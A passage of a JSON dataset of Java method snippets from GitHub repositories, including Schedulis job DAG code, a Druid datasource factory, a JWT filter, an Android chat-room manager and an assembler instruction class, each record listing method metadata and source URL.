"https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/JobDagNode.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34537, "method_name": "getJobConfiguration", "class_name": "JobDagNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Properties", "snippet": "  public Properties getJobConfiguration() {\n    return jobConfiguration;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/JobDagNode.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34538, "method_name": "toJson", "class_name": "JobDagNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object toJson() {\n    Map<String, Object> jsonObj = new HashMap<String, Object>();\n    jsonObj.put(\"name\", name);\n    jsonObj.put(\"level\", Integer.toString(level));\n    jsonObj.put(\"parents\", parents);\n    jsonObj.put(\"successors\", successors);\n    if (jobConfiguration != null) {\n      jsonObj.put(\"jobConfiguration\",\n          StatsUtils.propertiesToJson(jobConfiguration));\n    }\n    if (mapReduceJobState != null) {\n      jsonObj.put(\"mapReduceJobState\", mapReduceJobState.toJson());\n    }\n    return jsonObj;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/JobDagNode.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34539, "method_name": "fromJson", "class_name": "JobDagNode", "params": ["Object"], "throws": ["Exception"], "modifiers": ["public", "static"], "return_type": "JobDagNode", "snippet": "  public static JobDagNode fromJson(Object obj) throws Exception {\n    Map<String, Object> jsonObj = (HashMap<String, Object>) obj;\n    String name = (String) jsonObj.get(\"name\");\n\n    JobDagNode node = new JobDagNode(name);\n    node.setParents((ArrayList<String>) jsonObj.get(\"parents\"));\n    node.setSuccessors((ArrayList<String>) jsonObj.get(\"successors\"));\n    node.setLevel(Integer.parseInt((String) jsonObj.get(\"level\")));\n\n    // Grab configuration if it is available.\n    if (jsonObj.containsKey(\"jobConfiguration\")) {\n      node.setJobConfiguration(StatsUtils.propertiesFromJson(jsonObj\n          .get(\"jobConfiguration\")));\n    }\n\n    // Grab MapReduceJobState.\n    if (jsonObj.containsKey(\"mapReduceJobState\")) {\n      MapReduceJobState mapReduceJobState =\n          MapReduceJobState.fromJson(jsonObj.get(\"mapReduceJobState\"));\n      node.setMapReduceJobState(mapReduceJobState);\n    }\n\n    return node;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/JobDagNode.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34540, "method_name": "setGameRoleMemento", "class_name": "GameCaretaker", "params": ["GameRoleMemento"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setGameRoleMemento(GameRoleMemento gameRoleMemento) {\n        this.gameRoleMemento = gameRoleMemento;\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/memento/GameCaretaker.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34541, "method_name": "getGameRoleMemento", "class_name": "GameCaretaker", "params": [], "throws": null, "modifiers": ["public"], "return_type": "GameRoleMemento", "snippet": "    public GameRoleMemento getGameRoleMemento() {\n        return gameRoleMemento;\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/memento/GameCaretaker.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34542, "method_name": "getBDPInstance", "class_name": "WBDruidFactory", "params": ["Properties", "Logger"], "throws": null, "modifiers": ["public", "static"], "return_type": "DruidDataSource", "snippet": "\tpublic static DruidDataSource getBDPInstance(Properties props, Logger log) {\n\t\tif (bdpInstance == null ) {\n\t\t\tsynchronized (WBDruidFactory.class) {\n\t\t\t\tif(bdpInstance == null) {\n\t\t\t\t\ttry {\n\t\t\t\t\t\tbdpInstance = createDataSource(props, log, \"BDP\");\n\t\t\t\t    } catch (Exception e) {\n\t\t\t\t    \tthrow new RuntimeException(\"Error creating Druid DataSource\", e);\n\t\t\t\t    }\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\treturn bdpInstance;\n\t}", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/connectors/druid/WBDruidFactory.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34543, "method_name": "getJobInstance", "class_name": "WBDruidFactory", "params": ["Properties", "Logger"], "throws": null, "modifiers": ["public", "static"], "return_type": "DruidDataSource", "snippet": "\tpublic static DruidDataSource getJobInstance(Properties props, Logger log) {\n\t\tif (jobInstance == null ) {\n\t\t\tsynchronized (WBDruidFactory.class) {\n\t\t\t\tif(jobInstance == null) {\n\t\t\t\t\ttry {\n\t\t\t\t\t\tjobInstance = createDataSource(props, log, \"Job\");\n\t\t\t\t    } catch (Exception e) {\n\t\t\t\t    \tthrow new RuntimeException(\"Error creating Druid DataSource\", e);\n\t\t\t\t    }\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\treturn jobInstance;\n\t}", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/connectors/druid/WBDruidFactory.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34544, "method_name": "getMsgInstance", "class_name": "WBDruidFactory", "params": ["Properties", "Logger"], "throws": null, "modifiers": ["public", "static"], "return_type": "DruidDataSource", "snippet": "\tpublic static DruidDataSource getMsgInstance(Properties props, Logger log) {\n\t\tif (msgInstance == null ) {\n\t\t\tsynchronized (WBDruidFactory.class) {\n\t\t\t\tif(msgInstance == null) {\n\t\t\t\t\ttry {\n\t\t\t\t\t\tmsgInstance = createDataSource(props, log, \"Msg\");\n\t\t\t\t    } catch (Exception e) {\n\t\t\t\t    \tthrow new RuntimeException(\"Error creating Druid DataSource\", e);\n\t\t\t\t    }\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\treturn msgInstance;\n\t}", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/connectors/druid/WBDruidFactory.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34545, "method_name": "createDataSource", "class_name": "WBDruidFactory", "params": ["Properties", "Logger", "String"], "throws": null, "modifiers": ["private", "static"], "return_type": "DruidDataSource", "snippet": "\tprivate static DruidDataSource createDataSource(Properties props, Logger log, String type) {\n\t\tString name = null;\n\t\tString url = null;\n\t\tString username = null;\n\t\tString password = null;\n\t\t\n\t\tif (type.equals(\"BDP\")) {\n\t\t\tname = props.getProperty(\"bdp.datachecker.jdo.option.name\");\n\t\t\turl = props.getProperty(\"bdp.datachecker.jdo.option.url\");\n\t\t\tusername = props.getProperty(\"bdp.datachecker.jdo.option.username\");\n\t\t\tpassword = props.getProperty(\"bdp.datachecker.jdo.option.password\");\n\t\t\ttry {\n\t\t\t\tpassword = new String(Base64.getDecoder().decode(props.getProperty(\"bdp.datachecker.jdo.option.password\").getBytes()),\"UTF-8\");\n\t\t\t} catch (Exception e){\n\t\t\t\tlog.error(\"password decore failed\" + e);\n\t\t\t}\n\t\t} else if (type.equals(\"Job\")) {\n\t\t\tname = props.getProperty(\"job.datachecker.jdo.option.name\");\n\t\t\turl = props.getProperty(\"job.datachecker.jdo.option.url\");\n\t\t\tusername = props.getProperty(\"job.datachecker.jdo.option.username\");\n\t\t\tpassword = props.getProperty(\"job.datachecker.jdo.option.password\");\n\t\t\ttry {\n\t\t\t\tpassword = new String(Base64.getDecoder().decode(props.getProperty(\"job.datachecker.jdo.option.password\").getBytes()),\"UTF-8\");\n\t\t\t} catch (Exception e){\n\t\t\t\tlog.error(\"password decore failed\" + e);\n\t\t\t}\n\t\t}else if(type.equals(\"Msg\")){\n\t\t\tname = props.getProperty(\"msg.eventchecker.jdo.option.name\");\n\t\t\turl = props.getProperty(\"msg.eventchecker.jdo.option.url\");\n\t\t\tusername = props.getProperty(\"msg.eventchecker.jdo.option.username\");\n\t\t\ttry {\n\t\t\t\tpassword = new String(Base64.getDecoder().decode(props.getProperty(\"msg.eventchecker.jdo.option.password\").getBytes()),\"UTF-8\");\n\t\t\t} catch (Exception e){\n\t\t\t\tlog.error(\"password decore failed\" + e);\n\t\t\t}\n\t\t}\n\t\t\n\t\tint initialSize = Integer.valueOf(props.getProperty(\"datachecker.jdo.option.initial.size\", \"1\"));\n\t\tint maxActive = Integer.valueOf(props.getProperty(\"datachecker.jdo.option.max.active\", \"100\"));\n\t\tint minIdle = Integer.valueOf(props.getProperty(\"datachecker.jdo.option.min.idle\", \"1\"));\n\t\tlong maxWait = Long.valueOf(props.getProperty(\"datachecker.jdo.option.max.wait\", \"60000\"));\n\t\tString validationQuery = props.getProperty(\"datachecker.jdo.option.validation.quert\", \"SELECT 'x'\");\n\t\tlong timeBetweenEvictionRunsMillis = Long.valueOf(props.getProperty(\"datachecker.jdo.option.time.between.eviction.runs.millis\", \"6000\"));\n\t\tlong minEvictableIdleTimeMillis = Long.valueOf(props.getProperty(\"datachecker.jdo.option.evictable.idle,time.millis\", \"300000\"));\n\t\tboolean testOnBorrow = Boolean.valueOf(props.getProperty(\"datachecker.jdo.option.test.on.borrow\", \"true\"));\n\t\tint maxOpenPreparedStatements = Integer.valueOf(props.getProperty(\"datachecker.jdo.option.max.open.prepared.statements\", \"-1\"));\n\t\t\n\t\t\n\t\tif (timeBetweenEvictionRunsMillis > minEvictableIdleTimeMillis) {\n\t\t\ttimeBetweenEvictionRunsMillis = minEvictableIdleTimeMillis;\n\t\t}\n\t\t\n\t\tDruidDataSource ds = new DruidDataSource();\n\t\t\n\t\tif (StringUtils.isNotBlank(name)) {\n\t\t\tds.setName(name);\n\t\t}\n\t\t\n\t\tds.setUrl(url);\n\t    ds.setUsername(username);\n\t    ds.setPassword(password);\n\t    ds.setInitialSize(initialSize);\n\t    ds.setMinIdle(minIdle);\n\t    ds.setMaxActive(maxActive);\n\t    ds.setMaxWait(maxWait);\n\t    ds.setTestOnBorrow(testOnBorrow);\n\t    ds.setValidationQuery(validationQuery);\n\t    ds.setTimeBetweenEvictionRunsMillis(timeBetweenEvictionRunsMillis);\n\t    ds.setMinEvictableIdleTimeMillis(minEvictableIdleTimeMillis);\n\t    if (maxOpenPreparedStatements > 0) {\n\t      ds.setPoolPreparedStatements(true);\n\t      ds.setMaxPoolPreparedStatementPerConnectionSize(\n\t          maxOpenPreparedStatements);\n\t    } else {\n\t      ds.setPoolPreparedStatements(false);\n\t    }\n\t    log.info(\"Druid data source initialed!\");\n\t    return ds;\n\t}", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/connectors/druid/WBDruidFactory.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34546, "method_name": "onInterceptTouchEvent", "class_name": "CarouselViewRenderer", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onInterceptTouchEvent (android.view.MotionEvent p0)\n\t{\n\t\treturn n_onInterceptTouchEvent (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/CarouselViewRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 34547, "method_name": "n_onInterceptTouchEvent", "class_name": "CarouselViewRenderer", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onInterceptTouchEvent (android.view.MotionEvent p0);\n\n\n\tpublic void onScrollStateChanged (int p0)\n\t{\n\t\tn_onScrollStateChanged (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/CarouselViewRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 34548, "method_name": "onScrollStateChanged", "class_name": "CarouselViewRenderer", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onScrollStateChanged (int p0)\n\t{\n\t\tn_onScrollStateChanged (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/CarouselViewRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 34549, "method_name": "n_onScrollStateChanged", "class_name": "CarouselViewRenderer", "params": ["int"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onScrollStateChanged (int p0);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/CarouselViewRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 34550, "method_name": "monodroidAddReference", "class_name": "CarouselViewRenderer", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/CarouselViewRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 34551, "method_name": "monodroidClearReferences", "class_name": "CarouselViewRenderer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/CarouselViewRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 34552, "method_name": "successfulAuthentication", "class_name": "JwtAuthenticationFilter", "params": ["HttpServletRequest", "HttpServletResponse", "FilterChain", "Authentication"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void successfulAuthentication(HttpServletRequest request, HttpServletResponse response,\n\t\t\tFilterChain filterChain, Authentication authentication) {\n\t\tvar user = (User) authentication.getPrincipal();\n\t\tvar secretKey = Keys.hmacShaKeyFor(jwtSecret.getBytes());\n\t\tvar token = Jwts.builder().signWith(secretKey, SignatureAlgorithm.HS512).setHeaderParam(\"typ\", jwtType)\n\t\t\t\t.setIssuer(jwtIssuer).setAudience(jwtAudience).setSubject(user.getUsername())\n\t\t\t\t.setExpiration(new Date(System.currentTimeMillis() + 864000000)).compact();\n\t\tresponse.addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token);\n\t}", "url": "https://raw.githubusercontent.com/joshlong/security-jwt-fun/master/jwt-servlet/src/main/java/com/joshlong/jwt/JwtAuthenticationFilter.java", "stars": "4", "class_props": {"extends": "UsernamePasswordAuthenticationFilter", "implements": null, "modifiers": ["public"]}}, {"id": 34553, "method_name": "getInstance", "class_name": "HummerManager", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "HummerManager", "snippet": "    public static HummerManager getInstance() {\n        if (instance == null) {\n            instance = new HummerManager();\n        }\n        return instance;\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/facade/HummerManager.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34554, "method_name": "obtainMemberList", "class_name": "HummerManager", "params": ["Context", "ChatRoom", "List<UserInfo>", "long", "BaseAdapter"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void obtainMemberList(Context context, @NonNull ChatRoom mChatRoom, List<UserInfo> userInfos, long ownerId, BaseAdapter adapter) {\n        ((BaseActivity) context).showDialogProgress();\n        UserInfo userInfo = new UserInfo();//\u623f\u4e3b\u653e\u57280\u4f4d\u7f6e\n        userInfo.setRole(\"owner\");\n        userInfo.setUid(ownerId);\n        userInfos.add(userInfo);\n        fetchMembers(context, mChatRoom, userInfos, adapter);\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/facade/HummerManager.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34555, "method_name": "fetchMembers", "class_name": "HummerManager", "params": ["Context", "ChatRoom", "List<UserInfo>", "BaseAdapter"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void fetchMembers(Context context, @NonNull ChatRoom mChatRoom, List<UserInfo> userInfos, BaseAdapter adapter) {\n        HMR.getService(ChatRoomService.class).fetchMembers(mChatRoom, 100, 0, new HMR.CompletionArg<List<User>>() {\n            @Override\n            public void onSuccess(List<User> users) {\n                android.util.Log.d(TAG, \">>>>uid: \" + userInfos.get(0).getUid());\n                for (int i = 0; i < users.size(); i++) {\n                    if (users.get(i).getId() != userInfos.get(0).getUid()) {//\u53bb\u9664owner\n                        UserInfo userInfo = new UserInfo();\n                        userInfo.setUid(users.get(i).getId());\n                        userInfos.add(userInfo);\n                    }\n                }\n                if (!isOwner) {\n                    ((BaseActivity) context).dissMissDialogProgress();\n                    adapter.setData(userInfos);\n                } else {\n                    fetchMutedUsers(context, mChatRoom, userInfos, adapter);\n                }\n                Log.i(\"fetchMember\", String.format(Locale.US, \"success, member size:%d\", users.size()));\n            }\n\n            @Override\n            public void onFailed(Error err) {\n                ((BaseActivity) context).dissMissDialogProgress();\n                Log.i(\"fetchMember\", String.format(Locale.US, \"failed, err info:%s\", err.toString()));\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/facade/HummerManager.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34556, "method_name": "fetchMutedUsers", "class_name": "HummerManager", "params": ["Context", "ChatRoom", "List<UserInfo>", "BaseAdapter"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void fetchMutedUsers(Context context, @NonNull ChatRoom mChatRoom, List<UserInfo> userInfos, BaseAdapter adapter) {\n        HMR.getService(ChatRoomService.class).fetchMutedUsers(mChatRoom, new HMR.CompletionArg<Set<User>>() {\n            @Override\n            public void onSuccess(Set<User> members) {\n\n                if (members.size() > 0) {\n                    for (int i = 0; i < userInfos.size(); i++) {\n                        for (User user : members) {\n                            if (user.getId() == userInfos.get(i).getUid()) {\n                                userInfos.get(i).setMuted(true);\n                                android.util.Log.d(TAG, \"fetchMutedUsers onSuccess: \" + JSON.toJSONString(userInfos));\n                            }\n                        }\n                    }\n                }\n                android.util.Log.d(TAG, \"onSuccess: \" + JSON.toJSONString(userInfos));\n                adapter.resetData(userInfos);\n                ((BaseActivity) context).dissMissDialogProgress();\n            }\n\n            @Override\n            public void onFailed(Error error) {\n                ((BaseActivity) context).dissMissDialogProgress();\n                android.util.Log.e(TAG, \"onFailed: \" + error.toString());\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/facade/HummerManager.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34557, "method_name": "isOwnerOnLine", "class_name": "HummerManager", "params": ["ChatRoom", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void isOwnerOnLine(@NonNull ChatRoom mChatRoom, String uid) {\n        HMR.getService(ChatRoomService.class)\n                .fetchRoleMembers(mChatRoom, true, new HMR.CompletionArg<Map<String, List<User>>>() {\n                    @Override\n                    public void onSuccess(Map<String, List<User>> members) {\n                        if (members != null && members.get(\"owner\") != null && members.get(\"owner\").size() >= 1) {\n                            for (int i = 0; i < members.size(); i++) {\n                                if (members.get(\"owner\").get(0).getId() == Long.parseLong(uid)) {\n                                    isOwnerOnLine = true;\n                                } else {\n                                    isOwnerOnLine = false;\n                                }\n                            }\n                        }\n                    }\n\n                    @Override\n                    public void onFailed(Error err) {\n                        android.util.Log.d(TAG, \"onFailed: \" + err.toString());\n                    }\n                });\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/facade/HummerManager.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34558, "method_name": "sendSignalMessage", "class_name": "HummerManager", "params": ["Context", "ChatRoom", "String", "User"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void sendSignalMessage(Context context, ChatRoom mChatRoom, String content, User target) {\n        HMR.getService(ChatService.class).send(new Message(mChatRoom, ChatRoomService.Signal.unicast(target, content)), new HMR.Completion() {\n            @Override\n            public void onSuccess() {\n            }\n\n            @Override\n            public void onFailed(Error err) {\n                ((BaseActivity) context).dissMissDialogProgress();\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/facade/HummerManager.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34559, "method_name": "onMemberKicked", "class_name": "HummerManager", "params": ["Context", "ChatRoom", "User", "List<User>", "ChatMessageAdapter", "RecyclerView"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onMemberKicked(Context context, ChatRoom chatRoom, User admin, List<User> member, ChatMessageAdapter adapter, RecyclerView recyclerView) {\n        for (int i = 0; i < member.size(); i++) {\n            if (HMR.getMe().getId() == member.get(i).getId() && admin.getId() == HMR.getMe().getId()) {\n                HummerManager.isForceOut = true;\n                ((ChatRoomActivity) context).finish();\n                break;\n            }\n            if (HMR.getMe().getId() == member.get(i).getId()) {\n                HMR.getService(ChatRoomService.class)\n                        .fetchRoleMembers(chatRoom, false, new HMR.CompletionArg<Map<String, List<User>>>() {\n                            @Override\n                            public void onSuccess(Map<String, List<User>> members) {\n                                if (HMR.getMe().getId() == members.get(\"owner\").get(0).getId()) {\n                                    HummerManager.isOwner = true;\n                                } else {\n                                    HummerManager.isOwner = false;\n                                }\n                                HummerManager.isKick = true;\n                                ((ChatRoomActivity) context).finish();\n                            }\n\n                            @Override\n                            public void onFailed(Error err) {\n                                ((ChatRoomActivity) context).finish();\n                                android.util.Log.d(TAG, \"onFailed: \" + err.toString());\n                            }\n                        });\n\n            } else {\n                ChatMessage chatMessage = new ChatMessage();\n                chatMessage.setMsgType(adapter.TYPE_ITEM_CHATMESSAGE_TIP);\n                chatMessage.setMessage(member.get(i).getId() + \"\u88ab\u8e22\u51fa\u623f\u95f4\");\n                adapter.addNewData(chatMessage);\n                recyclerView.scrollToPosition(adapter.getItemCount() - 1);//\u6b64\u53e5\u4e3a\u8bbe\u7f6e\u663e\u793a\n            }\n        }\n\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/facade/HummerManager.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34560, "method_name": "getAddress", "class_name": "Instruction", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getAddress() {\n        return address;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/assembler/Instruction.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34561, "method_name": "getMode", "class_name": "Instruction", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getMode() {\n        return mode;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/assembler/Instruction.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34562, "method_name": "getOperand", "class_name": "Instruction", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getOperand() {\n        return operand;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/assembler/Instruction.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34563, "method_name": "getMnemonic", "class_name": "Instruction", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getMnemonic() {\n        return mnemonic;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/assembler/Instruction.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34564, "method_name": "getOperandString", "class_name": "Instruction", "params": [], "throws": null, "modifiers": ["public", "abstract"], "return_type": "String", "snippet": "    abstract public String getOperandString();\n\n    abstract public boolean isBranch();\n\n    public boolean isBranchTarget() {\n        return isBranchTarget;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/assembler/Instruction.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34565, "method_name": "isBranch", "class_name": "Instruction", "params": [], "throws": null, "modifiers": ["public", "abstract"], "return_type": "boolean", "snippet": "    abstract public boolean isBranch();\n\n    public boolean isBranchTarget() {\n        return isBranchTarget;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/assembler/Instruction.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34566, "method_name": "isBranchTarget", "class_name": "Instruction", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isBranchTarget() {\n        return isBranchTarget;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/assembler/Instruction.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34567, "method_name": "setBranchTarget", "class_name": "Instruction", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setBranchTarget() {\n        isBranchTarget = true;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/assembler/Instruction.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34568, "method_name": "getLabel", "class_name": "Instruction", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Label", "snippet": "    public Label getLabel() {\n        return label;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/assembler/Instruction.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34569, "method_name": "setLabel", "class_name": "Instruction", "params": ["Label"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLabel(Label label) {\n        this.label = label;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/assembler/Instruction.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34570, "method_name": "getLength", "class_name": "Instruction", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getLength() {\n        switch (mode) {\n        case MODE_IMMEDIATE:\n            return 2;\n        case MODE_DIRECT:\n            return 2;\n        case MODE_INDEXED:\n            return 2;\n        case MODE_EXTENDED:\n            return 3;\n        case MODE_IMPLIED:\n            return 1;\n        case MODE_RELATIVE:\n            return 2;\n        default:\n            return 1;\n        }\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/assembler/Instruction.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34571, "method_name": "resolveParams", "class_name": "DataSourceModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Map<String,Object>", "snippet": "    public Map<String, Object> resolveParams(){\n        if(null == parameterMap){\n            if (StringUtils.isNotBlank(parameter)){\n                parameterMap = Json.fromJson(getParameter(), Map.class);\n            }else {\n                parameterMap = new HashMap<>(4);\n            }\n        }\n        return parameterMap;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceModel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34572, "method_name": "getParameter", "class_name": "DataSourceModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getParameter() {\n        return parameter;\n    }", "url": 